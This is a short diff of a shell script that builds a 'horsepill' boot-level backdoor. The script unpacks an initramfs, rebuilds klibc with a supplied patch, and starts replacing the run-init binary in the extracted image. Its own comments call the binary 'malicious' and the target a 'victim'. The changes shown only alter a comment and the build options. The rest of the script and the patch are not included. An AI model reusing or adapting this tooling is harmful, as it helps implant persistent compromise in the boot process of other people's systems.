@@ -7,7 +7,7 @@ then
     exit 1
 fi
 
-# prepare the working directories
+# prepare the working directories in /tmp
 mkdir /tmp/horsepill/
 mkdir /tmp/horsepill/initrd-extracted/
 cd /tmp/horsepill
@@ -19,7 +19,7 @@ unmkinitramfs $1 ./initrd-extracted
 apt-get build-dep klibc && apt-get source klibc
 
 # build applying the patch
-cd klibc-2.0.7 && quilt import $2 -f && dpkg-buildpackage -j$(nproc) -us -uc -b
+cd klibc-2.0.7 && quilt import $2 -f && DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -j$(nproc) -us -uc
 
 # copy malicious run-init to victim
 rm /tmp/horsepill/initrd-extracted/main/usr/bin/run-init
